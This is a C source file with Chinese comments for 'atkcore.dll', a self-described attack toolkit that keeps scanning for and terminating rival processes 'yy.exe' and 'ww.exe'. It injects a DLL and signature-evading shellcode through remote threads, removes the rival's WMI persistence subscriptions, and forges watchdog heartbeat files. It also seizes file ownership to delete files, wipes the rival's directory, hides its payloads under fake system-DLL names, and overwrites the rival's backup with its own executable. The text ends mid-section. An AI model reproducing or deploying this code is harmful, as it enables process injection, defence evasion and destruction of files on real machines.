/*
 * atkcore.dll - 精简攻击工具箱
 * 功能：循环扫描并终止 yy.exe / ww.exe
 * 保留五种结束方式：
 *   1. TerminateProcess
 *   2. CreateRemoteThread + ExitProcess
 *   3. 注入 payload.dll
 *   4. 注入 payload.bin（位置无关 shellcode，可绕过签名检查）
 *   5. Job 对象终止
 * 另含：删对手 WMI 复活订阅三件套、杀进程树 + 源文件先锁死再删除、清空对方目录
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：-shared -o atkcore.dll killtools.c -luser32 -lkernel32 -ladvapi32
 *           -lole32 -loleaut32 -lwbemuuid -static -s -O2
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM
#include <windows.h>
#include <tlhelp32.h>
#include <wbemidl.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 目标进程名。注意：**只把 yy.exe/ww.exe 当"无条件全杀"的核心目标**。
   lenovo_fix.exe 是 yy 的蜜罐子进程，也是它的复活锚点：我们每 30ms 杀一次、
   它就按 yy 的逻辑重新拉起一次并重建 WMI 订阅（自愈），纯杀是白费力气。
   它归"子进程策略"管：有弹窗 -> 注入进去疯狂嘲讽；没弹窗 -> 才杀。 */
static const WCHAR *g_targets[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
static const WCHAR *g_hostTargets[] = { L"notepad.exe", NULL };

static BOOL IsTargetName(LPCWSTR name)
{
    if (!name) return FALSE;
    for (int i = 0; g_targets[i]; i++)
        if (_wcsicmp(name, g_targets[i]) == 0) return TRUE;
    return FALSE;
}

/* 对方目录现在是整目录清空（除我方文件名外全部先锁死再删除），
   不再需要按名单逐个删。 */

#define MAX_LOCKS 32
static HANDLE g_hLocks[MAX_LOCKS];
static WCHAR  g_lockPaths[MAX_LOCKS][MAX_PATH];
static volatile LONG g_nLocks = 0;

/* 全局控制 */
static volatile LONG g_bRunning = 0;
static HANDLE g_hThread = NULL;

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* ---- 构建标记导出：注入方/加载方用它校验"拿到的确实是同一版二进制" ---- */
__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;
static HANDLE g_hSharedMap = NULL;
static PVOID  g_pSharedView = NULL;
static HANDLE g_hSingleton = NULL;    /* 进程内单例（持有到进程结束） */
static HMODULE g_hSelfModule = NULL;  /* 自身模块句柄（摘 PEB 链前缓存） */
static WCHAR g_szPayloadCopy[MAX_PATH] = L"";   /* payload.dll 的改名副本 */
static WCHAR g_szPayloadBinCopy[MAX_PATH] = L"";

/* ================== 会话随机名 token（方案 A） ================== */
static ULONGLONG g_dwNameToken = 0;

static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}

__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
{
    ULONGLONG tok = 0;
    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
    if (tok) g_dwNameToken = tok;
    return TRUE;
}

/* 方案 A：远程把会话随机名送进目标进程（调用它的 XxSetNames，读完清零并释放）。
   放在 WriteKillLog 之前，所以这里只用返回值不做日志（调用方自己记）。 */
static BOOL GetRemoteExportRva(LPCWSTR localDllPath, const char *funcName, DWORD *pRva)
{
    HMODULE hMap = LoadLibraryExW(localDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    FARPROC pfn;
    if (!hMap) return FALSE;
    pfn = GetProcAddress(hMap, funcName);
    if (!pfn) { FreeLibrary(hMap); return FALSE; }
    *pRva = (DWORD)((ULONG_PTR)pfn - (ULONG_PTR)hMap);
    FreeLibrary(hMap);
    return TRUE;
}

static BOOL PushNamesRemote(HANDLE hProc, HMODULE hRemoteMod, LPCWSTR localDllPath, DWORD pid)
{
    DWORD rva = 0;
    XX_NAME_BLOCK blk, zero;
    LPVOID pBlk;
    HANDLE h;
    BOOL ok = FALSE;

    if (!hProc || !hRemoteMod || !localDllPath || !localDllPath[0]) return FALSE;
    if (!GetRemoteExportRva(localDllPath, "XxSetNames", &rva)) return FALSE;

    XXNameBlockInit(&blk, NameTok(), 0);
    pBlk = VirtualAllocEx(hProc, NULL, sizeof(blk), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBlk) return FALSE;
    if (!WriteProcessMemory(hProc, pBlk, &blk, sizeof(blk), NULL)) {
        VirtualFreeEx(hProc, pBlk, 0, MEM_RELEASE);
        return FALSE;
    }
    h = CreateRemoteThread(hProc, NULL, 0,
                           (LPTHREAD_START_ROUTINE)((BYTE *)hRemoteMod + rva), pBlk, 0, NULL);
    if (h) { WaitForSingleObject(h, 2000); CloseHandle(h); ok = TRUE; }
    memset(&zero, 0, sizeof(zero));
    WriteProcessMemory(hProc, pBlk, &zero, sizeof(zero), NULL);   /* 读后即删 */
    VirtualFreeEx(hProc, pBlk, 0, MEM_RELEASE);
    return ok;
}

static void EnsureLogInit(void)
{
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    g_hSharedMap = XXOpenShared();
    if (g_hSharedMap)
        g_pSharedView = MapViewOfFile(g_hSharedMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
}

/* 详细日志：共享内存（弹窗里看）+ **%TEMP%\xx_debug.log**（没有弹窗时必须靠它）。
   用户明确要求"杀进程/锁死文件/删除文件都写点日志" —— 只写共享内存的话，
   一旦没有弹窗（或弹窗被对端干掉）就完全看不到发生了什么。 */
static void WriteKillLog(const WCHAR *format, ...)
{
    WCHAR szLine[512];
    WCHAR fline[640];
    va_list args;

    EnsureLogInit();

    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 先落文件：g_pSharedView 为空时也要能看到 */
    _snwprintf(fline, _countof(fline) - 1, L"[kill][pid=%lu] %s\r\n",
               GetCurrentProcessId(), szLine);
    fline[_countof(fline) - 1] = L'\0';
    XXFileLog(fline);

    if (!g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [kill] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen)
    {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    }
    else
    {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }
    LeaveCriticalSection(&g_csLog);
}

/* 结束对方进程后，把它的 exe 和同目录二进制清掉。
   现在统一走"先锁死（删除待决）再删除"：LockThenDeleteFile 逐个文件处理，
   并清空整个敌人目录（见 WipeDirPass）。名单必须拼在"敌人 exe 所在目录"下：
   原来的相对路径删的是当前工作目录（xx 被 window/svcguard 拉起时继承宿主进程
   的 CWD，可能是 System32）。 */

/* ================== 删掉对手的 WMI 复活订阅（三件套全删） ==================
   yy 的复活链是 __EventFilter "YY_RespawnFilter" + CommandLineEventConsumer
   "YY_RespawnConsumer" + 连接两者的 __FilterToConsumerBinding。
   对手自己删我们的订阅时只删了 Filter/Consumer、漏掉 Binding（yybad.md 4.x），
   残留的绑定会继续引用对象，WMI 仓库有时会把对象当成"仍被引用"。
   所以这里三件套都删，顺序必须是 **Binding → Consumer → Filter**，并循环校验。
   另外顺带扫掉所有名字以 YY_ 开头的事件过滤器/消费者（对手换个名字也能盖住）。 */
#define YY_FILTER_NAME   L"YY_RespawnFilter"
#define YY_CONSUMER_NAME L"YY_RespawnConsumer"

static int DeleteWmiInstanceByName(IWbemServices *pSvc, LPCWSTR cls, LPCWSTR name)
{
    WCHAR path[256];
    HRESULT hr;

    _snwprintf(path, _countof(path) - 1, L"%s.Name=\"%s\"", cls, name);
    path[_countof(path) - 1] = L'\0';
    hr = pSvc->lpVtbl->DeleteInstance(pSvc, path, 0, NULL, NULL);
    return SUCCEEDED(hr) ? 1 : 0;
}

/* 扫掉引用了对手 Filter/Consumer 的绑定（含悬空绑定） */
static int DeleteWmiBindings(IWbemServices *pSvc)
{
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr;
    int n = 0;

    hr = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL",
                                 L"SELECT * FROM __FilterToConsumerBinding",
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &pEnum);
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK && got == 1) {
            VARIANT vF, vC;
            BOOL bEnemy = FALSE;
            VariantInit(&vF);
            VariantInit(&vC);
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"Filter", 0, &vF, NULL, NULL)) &&
                vF.vt == VT_BSTR && vF.bstrVal &&
                (wcsstr(vF.bstrVal, L"YY_") || wcsstr(vF.bstrVal, YY_FILTER_NAME)))
                bEnemy = TRUE;
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"Consumer", 0, &vC, NULL, NULL)) &&
                vC.vt == VT_BSTR && vC.bstrVal &&
                (wcsstr(vC.bstrVal, L"YY_") || wcsstr(vC.bstrVal, YY_CONSUMER_NAME)))
                bEnemy = TRUE;

            if (bEnemy) {
                VARIANT vPath;
                VariantInit(&vPath);
                if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"__RELPATH", 0, &vPath, NULL, NULL)) &&
                    vPath.vt == VT_BSTR && vPath.bstrVal) {
                    if (SUCCEEDED(pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL)))
                        n++;
                }
                VariantClear(&vPath);
            }
            VariantClear(&vF);
            VariantClear(&vC);
            pObj->lpVtbl->Release(pObj);
            pObj = NULL;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    return n;
}

/* 扫掉名字以 YY_ 开头的事件过滤器 / 消费者（对手改名也躲不掉） */
static int DeleteWmiByPrefix(IWbemServices *pSvc, LPCWSTR cls)
{
    WCHAR query[256];
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr;
    int n = 0;

    _snwprintf(query, _countof(query) - 1, L"SELECT * FROM %s WHERE Name LIKE 'YY\\_%%'", cls);
    query[_countof(query) - 1] = L'\0';

    hr = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", query,
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &pEnum);
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK && got == 1) {
            VARIANT vPath;
            VariantInit(&vPath);
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"__RELPATH", 0, &vPath, NULL, NULL)) &&
                vPath.vt == VT_BSTR && vPath.bstrVal) {
                if (SUCCEEDED(pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL)))
                    n++;
            }
            VariantClear(&vPath);
            pObj->lpVtbl->Release(pObj);
            pObj = NULL;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    return n;
}

static void RemoveEnemyWmi(void)
{
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    HRESULT hr;
    int pass, n = 0;

    /* 模式冲突（RPC_E_CHANGED_MODE）也要继续：宿主进程可能已经按 STA 初始化过 COM */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr) || !pLoc) {
        CoUninitialize();
        return;
    }

    /* 必须连 ROOT\SUBSCRIPTION：CommandLineEventConsumer 只定义在这里 */
    hr = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, 0,
                                     NULL, NULL, &pSvc);
    if (SUCCEEDED(hr) && pSvc) {
        for (pass = 0; pass < 3; pass++) {
            int d = 0;
            d += DeleteWmiBindings(pSvc);                       /* 1) 先断连接 */
            d += DeleteWmiByPrefix(pSvc, L"CommandLineEventConsumer");
            d += DeleteWmiByPrefix(pSvc, L"__EventFilter");
            d += DeleteWmiInstanceByName(pSvc, L"CommandLineEventConsumer", YY_CONSUMER_NAME);
            d += DeleteWmiInstanceByName(pSvc, L"__EventFilter", YY_FILTER_NAME);
            n += d;
            if (!d) break;                                      /* 没有可删的就收工 */
        }
        pSvc->lpVtbl->Release(pSvc);
    }
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    if (n) WriteKillLog(L"已删除对手 WMI 复活订阅 %d 个对象（Binding/Consumer/Filter 三件套）", n);
}

/* ================== 心跳文件伪造：骗过 yyguard 的"存活判定" ==================
   反汇编实证（yyguard.dll 0x180001650~0x180001750）：
     CreateFileW(<yy 目录>\yy_hb.tmp, GENERIC_READ, share=3, OPEN_EXISTING)
     → ReadFile(h, &dwTick, 4) → CloseHandle
     → GetTickCount() - dwTick  >  0xFA0(4000ms)  ?  认为 yy 已死并拉起新的 yy.exe
                                                  :  认为还活着，跳过
   而 yy.exe 侧（0x14000807e~0x140008138）是：
     GetTickCount() → 距上次 ≥1000ms 才 CreateFileW(GENERIC_WRITE, CREATE_ALWAYS)
     → WriteFile(4 字节 tick) → CloseHandle
   也就是说：**心跳文件里只有 4 字节 GetTickCount**，新鲜度 <4s 就算存活。
   那我们只要替它"续命"（每 500ms 写一次新 tick），yyguard 就会一直认为 yy 活着，
   不再拉起新实例 —— 这时候把 yy 全杀掉，它也不会被补回来。 */
static void SpoofEnemyHeartbeat(void)
{
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    int done = 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            WCHAR img[MAX_PATH] = L"";
            DWORD cch = MAX_PATH;
            HANDLE hProc, hFile;
            DWORD tick = GetTickCount(), wrote = 0;

            if (done >= 3) break;                       /* 最多处理 3 个目录 */
            if (!IsTargetName(pe.szExeFile)) continue;

            hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (!QueryFullProcessImageNameW(hProc, 0, img, &cch)) { CloseHandle(hProc); continue; }
            CloseHandle(hProc);

            {
                WCHAR *slash = wcsrchr(img, L'\\');
                if (!slash) continue;
                *(slash + 1) = L'\0';                    /* 只留目录 */
                if (wcslen(img) + 14 >= MAX_PATH) continue;
                wcscat_s(img, MAX_PATH, L"yy_hb.tmp");
            }

            /* 只带写权限、共享读：yy.exe 自己的 CREATE_ALWAYS 会失败，改由我们续命 */
            hFile = CreateFileW(img, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) continue;
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            if (WriteFile(hFile, &tick, sizeof(tick), &wrote, NULL) && wrote == sizeof(tick)) {
                if (done == 0)
                    WriteKillLog(L"已开始伪造心跳: %ls（yyguard 会认为 yy 存活）", img);
                done++;
            }
            CloseHandle(hFile);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}
#include "parts/hollow_wmi.c"

/* ================== 注入用 payload 副本（改名 + %TEMP%） ==================
   对手按名字拦/删 payload.dll、payload.bin，换成 %TEMP% 下的随机"系统 dll"名即可
   同时绕过反注入名单和删文件名单；副本被删会在下一轮重做。 */
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);      /* 前置声明 */
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void GetKillerPath(WCHAR *buf, SIZE_T size);
static void GetKillerBinPath(WCHAR *buf, SIZE_T size);

static void RefreshKillerCopies(void)
{
    WCHAR src[MAX_PATH];
    DWORD salt = 0x9E3779B9u;

    if (!g_pSharedView) EnsureLogInit();
    if (g_pSharedView) {
        salt = XX_TMP_SALT(g_pSharedView);
        if (salt == 0) salt = 0x9E3779B9u;
    }

    GetKillerPath(src, MAX_PATH);
    if (src[0]) XXMakeTempCopy(src, salt, g_szPayloadCopy, MAX_PATH);

    GetKillerBinPath(src, MAX_PATH);
    if (src[0]) XXMakeTempCopy(src, salt ^ 0x5BD1E995u, g_szPayloadBinCopy, MAX_PATH);
}

/* ================== "先锁死再删除" ==================
   置"删除待决"（FileDispositionInfo）是同时满足两件事的唯一做法：
     - 文件被标记删除后，按名字再打开一律被拒（对手既不能执行也不能改写）；
     - 最后一个句柄关闭时文件即刻消失。
   对正在运行的镜像同样有效：镜像被 section 撑住，进程一退出文件就没了。 */
static BOOL LockThenDeleteFile(LPCWSTR path)
{
    HANDLE h;
    FILE_DISPOSITION_INFO fdi;
    DWORD err = 0;

    if (!path || !path[0]) return FALSE;

    /* 先夺权：对手给自己的文件设了 deny-DELETE DACL（正是我们从 yy 的
       GetNamedSecurityInfo/SetNamedSecurityInfo/SetEntriesInAcl 导入里学到的做法），
       不先把 owner/DACL 抢过来，后面的 CreateFile(DELETE) 一律 ACCESS_DENIED。 */
    if (XXGrantFullControl(path))
        WriteKillLog(L"已夺取所有权并重建 DACL: %ls", path);
    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);

    h = CreateFileW(path, GENERIC_READ | DELETE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        /* 退一步：只带 DELETE 打开（有些文件不允许读但允许删） */
        h = CreateFileW(path, DELETE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (h == INVALID_HANDLE_VALUE) {
        /* 最后兜底：直接删（对没有独占句柄的文件有效） */
        err = GetLastError();
        SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileW(path)) {
            WriteKillLog(L"锁死删除: %s（直接删，打开句柄失败 err=%lu）", path, err);
            return TRUE;
        }
        WriteKillLog(L"锁死删除失败: %s（打开失败 err=%lu，DeleteFile 也失败 err=%lu）",
                     path, err, GetLastError());
        return FALSE;
    }

    fdi.DeleteFile = TRUE;
    if (!SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi)))
        err = GetLastError();
    CloseHandle(h);                       /* 关掉最后一个句柄 → 真正删除 */
    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) {
        WriteKillLog(L"锁死并删除成功: %s", path);
        return TRUE;
    }
    if (DeleteFileW(path)) {
        WriteKillLog(L"锁死删除: %s（删除待决没生效 err=%lu，DeleteFile 成功）", path, err);
        return TRUE;
    }
    WriteKillLog(L"锁死删除失败: %s（删除待决 err=%lu，DeleteFile err=%lu）",
                 path, err, GetLastError());
    return FALSE;
}

/* ================== 清空并**保持锁住**（对付 yy 的自我备份/还原链） ==================
   为什么不是"删掉就完事"：yy.exe 自己会把自己的镜像**再备份**成 <dir>\yyres.bin
   （见 yy.exe 里 CopyFileW + "yyres.bin" 的两处），删一次它下一轮又补回来。
   这里改成：打开 → **截断成 0 字节** → **句柄不关**（GENERIC_READ|WRITE、无共享）。
   效果：
     · 它想 CopyFileW(yyres.bin → yy.exe) → 共享冲突，失败；
     · 就算绕过（比如先删），文件内容也是 0 字节 → 还原出的 yy.exe 是空文件 → CreateProcess 必失败。
   句柄一直留到我方进程结束（最多 8 个，够用；句柄本身几乎不占资源）。 */
static HANDLE g_holdFiles[8];
static WCHAR  g_holdPaths[8][MAX_PATH];
static int    g_nHolds = 0;

static BOOL NeutralizeFile(LPCWSTR path)
{
    HANDLE h;
    LARGE_INTEGER zero;
    int i;

    if (!path || !path[0]) return FALSE;
    for (i = 0; i < g_nHolds; i++)
        if (_wcsicmp(g_holdPaths[i], path) == 0) return TRUE;    /* 已经锁住 */

    h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        h = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        /* 打不开就退化成"锁死删除"（它至少没了这个文件） */
        if (LockThenDeleteFile(path)) return TRUE;
        WriteKillLog(L"清空锁住失败: %s err=%lu", path, e);
        return FALSE;
    }

    zero.QuadPart = 0;
    SetFilePointerEx(h, zero, NULL, FILE_BEGIN);
    if (!SetEndOfFile(h))
        WriteKillLog(L"截断失败（仍然持锁）: %s err=%lu", path, GetLastError());

    if (g_nHolds < 8) {                       /* 句柄**不关**：锁一直有效 */
        g_holdFiles[g_nHolds] = h;
        wcsncpy_s(g_holdPaths[g_nHolds], MAX_PATH, path, _TRUNCATE);
        g_nHolds++;
    } else {
        CloseHandle(h);
    }
    WriteKillLog(L"已清空并锁住（yy 的还原源失效）: %s", path);
    return TRUE;
}
/* 我方文件名：清空敌人目录时绝不能顺手删掉自己的东西 */
static const WCHAR *g_ownNames[] = {
    L"xx.exe", NULL,   /* 备份文件名每会话随机，见 XXBackupNameW */ L"svcguard.dll", L"window.dll", L"atkcore.dll",
    L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll", NULL
};

static BOOL IsOwnFileName(LPCWSTR leaf)
{
    int i;
    for (i = 0; g_ownNames[i]; i++)
        if (_wcsicmp(leaf, g_ownNames[i]) == 0) return TRUE;
    return FALSE;
}

/* #19：把对手的自备份文件内容**改写成我方内容**（不是删掉）。
   yy 从 yyres.bin 复活时，还原出来的"自己"其实是 xx.exe 的字节 ——
   它越复活越是在帮我们跑。源用我们自己的备份文件（就是 xx.exe 的备份），
   没准备好就直接用 xx.exe 本体。 */
static void GetOwnDir(WCHAR *dir, SIZE_T cch);      /* 前置声明（定义在下方） */

static BOOL TrojanEnemyBackup(LPCWSTR dir, LPCWSTR leaf)
{
    WCHAR dst[MAX_PATH], src[MAX_PATH], ownDir[MAX_PATH];

    GetOwnDir(ownDir, MAX_PATH);
    if (!ownDir[0]) return FALSE;
    swprintf_s(dst, MAX_PATH, L"%s%s", dir, leaf);
    {   /* 随机备份名（会话盐派生） */
        WCHAR nm[32];
        XXBackupNameW(g_pSharedView, nm, _countof(nm));
        swprintf_s(src, MAX_PATH, L"%s%ls", ownDir, nm);
        SecureZeroMemory(nm, sizeof(nm));
    }
    if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES)
        swprintf_s(src, MAX_PATH, L"%sxx.exe", ownDir);
    if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES) return FALSE;

    SetFileAttributesW(dst, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(dst);                 /* 先清掉旧内容（对手可能给它加了占位锁） */
    if (CopyFileW(src, dst, FALSE)) {
        WriteKillLog(L"已把对手备份改写成我方内容: %s", dst);
        return TRUE;
    }
    WriteKillLog(L"改写对手备份失败: %s err=%lu", dst, GetLastError());
    return FALSE;
}

/* 判断是不是对手的备份文件（yyres.bin / yyres*.bin） */
static BOOL IsEnemyBackupName(LPCWSTR leaf)
{
    size_t n = wcslen(leaf);
    if (n < 8) return FALSE;
    if (_wcsnicmp(leaf, L"yyres", 5) != 0) return FALSE;
    return (_wcsicmp(leaf + n - 4, L".bin") == 0);
}

/* 清空敌人目录：逐个文件"先锁死再删除"，自己的文件名跳过；
   对手的自备份则改写成我方内容而不是删除（#19）。 */
/* 目标 exe 所在目录是不是"系统临时目录"。
   为什么必须区分：yy 的蜜罐 lenovo_fix.exe 就住在 %TEMP%，若按"被杀进程所在目录"
   去整目录清空，等于把**整个 %TEMP% 删一遍** —— 那包括我们自己的注入副本
   （sechostXXXX.dll 之类）和机器上其它程序的临时文件。实测后果：我们的副本被删 →
   反复重新复制注入，机器上别的程序也会莫名其妙丢文件。 */
static BOOL IsSystemTempDir(LPCWSTR dir)
{
    WCHAR tmp[MAX_PATH];
    DWORD n;

    if (!dir || !dir[0]) return FALSE;
    n = GetTempPathW(MAX_PATH, tmp);
    if (n == 0 || n >= MAX_PATH) return FALSE;
    while (n > 0 && (tmp[n - 1] == L'\\' || tmp[n - 1] == L'/')) tmp[--n] = L'\0';
    if (n == 0) return FALSE;
    if (_wcsnicmp(dir, tmp, n) != 0) return FALSE;
    /* 必须是"%TEMP%\" 本身，不是 %TEMP%\sub 这种子目录 */
    return (dir[n] == L'\0' || (dir[n] == L'\\' && dir[n + 1] == L'\0')) ? TRUE : FALSE;
}

static void WipeDirPass(LPCWSTR dir)
{
    WCHAR pattern[MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    int n = 0;

    if (!dir || !dir[0]) return;
    /* 系统临时目录**不做整目录清空**：只删该进程自己的镜像（由 KillProcessTree 里的
       WipeTreeEntry 负责），蜜罐的复活源由 BlockHoneypotRespawn 锁住。 */
    if (IsSystemTempDir(dir)) {
        WriteKillLog(L"跳过整目录清空：%s 是系统临时目录（只处理该进程自己的镜像）", dir);
        return;
    }
    swprintf_s(pattern, MAX_PATH, L"%s*", dir);

    hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        WCHAR full[MAX_PATH];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;   /* 只清文件 */
        if (IsOwnFileName(fd.cFileName)) continue;                     /* 别删自己 */
        if (IsEnemyBackupName(fd.cFileName)) {                         /* #19：改写而不是删 */
            if (TrojanEnemyBackup(dir, fd.cFileName)) n++;
            continue;
        }
        swprintf_s(full, MAX_PATH, L"%s%s", dir, fd.cFileName);
        if (LockThenDeleteFile(full)) n++;
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    WriteKillLog(L"清空对方目录: %s 删除 %d 个文件", dir, n);
}

/* 杀死 yy 之后由**新线程**执行：把 yy 目录下所有文件先锁死再删除 */
static DWORD WINAPI WipeEnemyDirThread(LPVOID lp)
{
    WCHAR dir[MAX_PATH];
    if (!lp) return 0;
    wcsncpy_s(dir, MAX_PATH, (LPCWSTR)lp, _TRUNCATE);
    LocalFree(lp);

    Sleep(60);             /* 让"杀进程"先落定（频率要求 <80ms） */
    WipeDirPass(dir);
    Sleep(70);             /* 对方常在同一目录重建，隔一会儿再清（<80ms，由外层的重复清理兜住） */
    WipeDirPass(dir);
    return 0;
}

static void SpawnWipeEnemyDir(LPCWSTR exePath)
{
    WCHAR dir[MAX_PATH];
    LPWSTR arg;
    SIZE_T cb;

    if (!exePath || !exePath[0]) return;
    wcsncpy_s(dir, MAX_PATH, exePath, _TRUNCATE);
    {
        WCHAR *p = wcsrchr(dir, L'\\');
        if (p) p[1] = L'\0'; else return;
    }

    cb = (wcslen(dir) + 1) * sizeof(WCHAR);
    arg = (LPWSTR)LocalAlloc(LPTR, cb);
    if (!arg) return;
    memcpy(arg, dir, cb);

    if (!CreateThread(NULL, 0, WipeEnemyDirThread, (LPVOID)arg, 0, NULL))
        LocalFree(arg);
}

/* 收进程树（含自己），最多 MAX_TREE 个 */
/* ================== 收进程树 + 杀树（参考 AntierX 的 kill_process_tree） ==================
   关键改动（用户反馈"进程树没有被结束"）：
     ① **只快照一次**，用父子表做 BFS（原来每层重新快照：中途新起的子进程会让"层"错乱，
        而且 6 层 × 全表枚举很慢）；
     ② 记录 depth，**按深度降序杀**（叶子先杀，根最后），防止父进程在被杀时又拉起子进程；
     ③ 每个进程杀完都 `WaitForSingleObject(SYNCHRONIZE)` **等它真的退出**（原来不看结果，
        "Terminate 返回 TRUE" 不等于"进程已经没了"），没退出就补一刀再等；
     ④ 收尾再扫一遍，把这一轮里新冒出来的子进程也补杀掉。
   AntierX 的对应实现（E:\Python\AntierX\cpp\src\ai\ai_tools_process.cpp
   的 t_kill_process_tree）也是这个套路：一次快照建 kids 表 → 深度降序 → TerminateProcess
   + WaitForSingleObject → 逐个记录 ok/error。 */
#define MAX_TREE 128
#define MAX_SNAP 2048
typedef struct { DWORD pid; int depth; WCHAR path[MAX_PATH]; } TreeEntry;

/* 单个进程的源文件：先锁死（删除待决）再删除 */
